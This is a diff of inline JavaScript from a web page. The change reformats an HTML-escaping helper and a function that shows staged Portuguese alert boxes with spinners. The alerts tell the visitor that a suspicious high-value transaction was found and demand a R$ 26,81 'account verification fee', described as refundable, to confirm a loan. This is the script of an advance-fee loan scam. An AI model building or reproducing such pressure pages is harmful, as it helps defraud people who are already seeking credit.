@@ -559,80 +559,80 @@
     </script>
     
     <script>
-        function escapeHTML(str) {
-            return String(str)
-                .replace(/&/g, "&")
-                .replace(/</g, "<")
-                .replace(/>/g, ">")
-                .replace(/"/g, """)
-                .replace(/'/g, "'");
-        }
-        
-        function nl2brSafe(str) {
-            return escapeHTML(str).replace(/\n/g, "<br>");
-        }
+  function escapeHTML(str) {
+    return String(str)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#39;");
+  }
 
-        function exibirAlertasComSpinner() {
-            const wrapper = document.querySelector(".wrapper-final");
-            if (!wrapper) return;
-            wrapper.innerHTML = "";
+  function nl2brSafe(str) {
+    return escapeHTML(str).replace(/\n/g, "<br>");
+  }
 
-            const alerts = [
-                { 
-                    icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", 
-                    text: "Identificamos uma movimentação de valor alto suspeita!" 
-                },
-                { 
-                    icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", 
-                    text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação de Conta para garantir a transferência segura e evitar possíveis fraudes." 
-                },
-                { 
-                    icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", 
-                    text: "Finalize o pagamento da Taxa de Verificação de Conta no valor de R$ 26,81 e confirme seu empréstimo. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", 
-                    strong: true 
-                }
-            ];
+  function exibirAlertasComSpinner() {
+    const wrapper = document.querySelector(".wrapper-final");
+    if (!wrapper) return;
+    wrapper.innerHTML = "";
 
-            let index = 0;
+    const alerts = [
+      {
+        icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png",
+        text: "Identificamos uma movimentação de valor alto suspeita!"
+      },
+      {
+        icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png",
+        text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação de Conta para garantir a transferência segura e evitar possíveis fraudes."
+      },
+      {
+        icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png",
+        text: "Finalize o pagamento da Taxa de Verificação de Conta no valor de R$ 26,81 e confirme seu empréstimo. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.",
+        strong: true
+      }
+    ];
 
-            function showNext() {
-                if (index >= alerts.length) return;
+    let index = 0;
 
-                const spinner = document.createElement("div");
-                spinner.className = "spinner";
-                wrapper.appendChild(spinner);
+    function showNext() {
+      if (index >= alerts.length) return;
 
-                setTimeout(() => {
-                    spinner.remove();
+      const spinner = document.createElement("div");
+      spinner.className = "spinner";
+      wrapper.appendChild(spinner);
 
-                    const a = alerts[index];
-                    const box = document.createElement("div");
-                    box.className = "alert-box" + (a.strong ? " strong" : "");
+      setTimeout(() => {
+        spinner.remove();
 
-                    const icon = document.createElement("img");
-                    icon.className = "icon-img";
-                    icon.alt = "Info";
-                    icon.src = a.icon;
+        const a = alerts[index];
+        const box = document.createElement("div");
+        box.className = "alert-box" + (a.strong ? " strong" : "");
 
-                    const txt = document.createElement("div");
-                    txt.innerHTML = nl2brSafe(a.text);
+        const icon = document.createElement("img");
+        icon.className = "icon-img";
+        icon.alt = "Info";
+        icon.src = a.icon;
 
-                    box.appendChild(icon);
-                    box.appendChild(txt);
-                    wrapper.appendChild(box);
+        const txt = document.createElement("div");
+        txt.innerHTML = nl2brSafe(a.text);
 
-                    requestAnimationFrame(() => {
-                        box.style.display = "flex";
-                    });
+        box.appendChild(icon);
+        box.appendChild(txt);
 
-                    index++;
-                    setTimeout(showNext, 900);
-                }, 700);
-            }
+        // mostra e deixa a animação rodar
+        box.style.display = "flex";
+        wrapper.appendChild(box);
 
-            showNext();
-        }
-    </script>
+        index++;
+        setTimeout(showNext, 900);
+      }, 700);
+    }
+
+    showNext();
+  }
+</script>
+
 
     <script src="js/upsells.js"></script>
     <script>
